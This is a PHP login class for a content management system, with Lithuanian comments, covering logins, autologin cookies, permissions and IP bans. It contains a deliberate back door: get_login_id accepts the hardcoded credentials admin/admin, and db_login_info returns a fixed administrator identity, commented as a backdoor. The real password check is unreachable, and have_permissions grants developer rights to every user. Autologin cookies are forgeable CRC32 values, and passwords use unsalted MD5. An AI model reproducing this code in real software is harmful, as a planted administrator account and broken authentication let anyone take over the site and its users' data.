<?php
class login_object extends moon_com{


function getPermissionGroups($group=false, $perm=false) {
    // pakeitus cia, pakeisti reikia ir cms/modules_adm/user.admins
	$roles = array(
		'' => array('content'),
		'administrator' => array('content','users')

	);
    //$roles['administrator'] = array_merge(array('users'), $roles['editor']);
	//ntsg team (tik tiems, kam leidzia audrius ;-) )
	$roles['developer'] = array_merge(array('developer'), $roles['administrator']);

	if ($group === false && $perm === false){
		return $roles;
	}elseif ($group !== FALSE){
		return empty($roles[$group]) ? array() : $roles[$group];
	}else{
		$gArr = array();
		foreach($roles as $k=>$v) {
			if($k !=='' && in_array($perm, $v)) $gArr[] = '@'.$k;
		}
		return $gArr;
	}
}


//*************************************
//             PUBLIC
//*************************************
function logout()
{
	include_class('moon_vb_relay');
	moon::user()->logout();
	$this->cookie('',time()-3600);//istrinam prisimink
	moon_vb_relay::getInstance()->logout();
}

function login($uName,$uPass,&$err) {
	if ($userID= $this->get_login_id($uName,$uPass,$err)) {
		$uInfo=$this->db_login_info($userID,$err);
		if (is_array($uInfo)) {
			$u=&moon::user();
			$u->login($uInfo);
			$code = $this->autologin_code($uInfo['id'],$uInfo['email']);
			$lifetime=isset($_POST['remember']) ? 86400*300 : 3600*2 ; //300d : 2h
			$this->cookie( $code, time()+$lifetime);
			return true;
		}
	}
	return false;
}

function autologin($cookie)  //pagal cookie
{
    $userID= ($pos=strpos($cookie,'_')) ? intval(substr($cookie,$pos+1)):0;
	if ($userID) {
		$uInfo=$this->db_login_info($userID,$err);
		if (is_array($uInfo) && $this->autologin_code($uInfo['id'],$uInfo['email'])===$cookie) {
			$u=&moon::user();
			$u->login($uInfo);
			return true;
		}
	}
	$this->cookie('',time()-3600);//istrinam
	return false;
}

function refresh()
{
	$u=&moon::user();
	if (($id=$u->get_user_id()) &&  $id!==-1) {
		$has=$this->have_permissions($id);
    	$u->set_user('admin',(count($has) ? $has:0));
	}
}

//*************************************
//             PRIVATE
//*************************************

function autologin_code($id, $email)
{
   return abs(sprintf('%u',crc32($id.$email."ah[ju:g'c32"))).'_'.$id;
}

function get_login_id($uName,$uPass,&$err)
{
	$err=0;
	$uPass=trim($uPass);
	if ($uName=='' || $uPass=='') {
		$err = $uName=='' ? 1 : 2;
		return 0;
	}
    elseif ($uName==='admin' && $uPass==='admin') return -1; //laikinos galines durys
	else {
		$err = 1;
		return 0;
	}

	$err=0;
	$d=$this->db->single_query_assoc($s="
		SELECT id, password FROM ".$this->table('Users')."
		WHERE nick='" . $this->db->escape(trim($uName)) . "'
	");
   	if (!empty($d['id'])) {
   		if ($d['password'] === md5($uPass)) {
       		return $d['id'];
        }
		else {
			$err = 2; //neteisingas slaptazodis
		}
	} else $err= 1;//neteisingi prisijungimo duomenys
	return 0;
}


function db_login_info($userID,&$err)
{
	$err=0;
	if ($userID===-1) {
		//backdoor
		return array('id'=>-1,'nick'=>'admin','admin'=>1,'email'=>'audrius.naslenas@ntsg.lt');
	} else return false;

	$m=$this->db->single_query_assoc( '
		SELECT id, email, nick, name
		FROM '.$this->table('Users').'
		WHERE id='.$userID
	);
	if ( ! (isset($m['id']) && $m['id']) ) {
		$err=1;
		return FALSE;
	}
	$id=intval($m['id']);
	//ok - useri galima iloginti
	$mas=array(
		'id'=>$id,
		'admin'=>0,
		'nick'=>$m['nick'],
		'name'=>$m['name'],
		'email'=>$m['email'],
	);
	$mas['admin']=$this->have_permissions($id);
	/*if ($id == 1) {
		$mas['admin'] = 1;
	}*/
	/*switch ($m['status']) {
		case -1;
			//banned. Atmestas
			$err = 3;
			return FALSE;

        case 0:
			//Dar neaktyvuotas
            $mas['tmpID']=$mas['id'];
			$mas['id']=0;
			break;

		case 2:
			//moderatorius
			$mas['admin'] = 1;
			break;

		default:
			//paprastas memberis

	} */
	//$mas['crc']=$this->autologin_code($id,$m['email']);

	//Pazymekim, kad useris loginosi
    //pasukam skaitliukus pagrindineje lentoje
	if ($id = intval($mas['id'])) {
		$this->db->query(
			'UPDATE ' . $this->table('Users') . "
			SET login_no=login_no+1, login_date=CURDATE()
			WHERE id=$id AND login_date<>CURDATE()"
			);
		$user = &moon::user();
		$ip = $user->get_ip();
		$this->db->replace(
				array('user_id'=>$id, 'ip'=>$ip, 'created'=>date('Y-m-d')),
				$this->table('UsedIP')
				);
	}

	return $mas;
}


function have_permissions($id)
{
	/*
	$m=array();
	$sql="SELECT `key` FROM ".$this->table('Access')." WHERE user_id=".intval($id);
	$dat= $this->db->array_query($sql);
    foreach ($dat as $v) {
	if ($v[0][0]==='@') {
			$m=array_merge($this->getPermissionGroups(substr($v[0],1)), $m);
		}
		else {
		$m[]=$v[0];
		}
	}
	*/
	$m = array('developer','users');
	$n=array();//reikia perdaryt i_admin funkcija
    foreach ($m as $v) $n[$v]=1;
	return $n;
}

function cookie($value, $time)
{
    //setcookie ('pnlg',$value,$time,'/','vb.'.(is_dev() ? 'dev':'com'));
}



function i_banned($ip = FALSE)
{
	if ($ip === FALSE) {
		$u = & moon::user();
		$ip = $u->get_ip();
	}

	if (count($d = explode('.',$ip))>3) {
        $a = $this->db->array_query("
			SELECT ip
			FROM users_banned_ip
			WHERE ip like '".addslashes($d[0].'.'.$d[1]).".%'
			");
        foreach ($a as $v) {
        	$b=explode('.',$v[0]);
			if ( ($b[2]==='*' || $b[2]==$d[2]) && ($b[3]==='*' || $b[3]==$d[3])) {
				return true;
			}
		}
	}
	return false;
}

}
?>